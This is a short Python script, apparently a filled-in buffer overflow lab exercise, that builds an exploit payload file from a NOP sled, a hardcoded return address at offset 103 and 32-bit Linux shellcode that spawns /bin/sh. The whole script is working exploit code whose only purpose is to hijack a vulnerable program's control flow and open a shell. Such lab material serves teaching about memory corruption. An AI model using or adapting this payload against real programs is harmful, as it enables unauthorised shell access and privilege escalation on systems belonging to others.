#!/usr/bin/python3
import sys

shellcode= (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(b'\x90'*517)

#########################################################################
# Replace 0 with the correct offset value
offset = 103

# Fill the return address field with the address of the shellcode
# Replace 0xFF with the correct value
content[offset+0] = 0x90   # fill in the 1st byte (least significant byte)
content[offset+1] = 0xed   # fill in the 2nd byte
content[offset+2] = 0xff   # fill in the 3rd byte
content[offset+3] = 0xbf   # fill in the 4th byte (most significant byte)
#########################################################################

# Put the shellcode at the end
start = 517 - len(shellcode)
content[start:] = shellcode

# Write the content to badfile
file = open("shellcode_1", "wb")
file.write(content)
file.close()
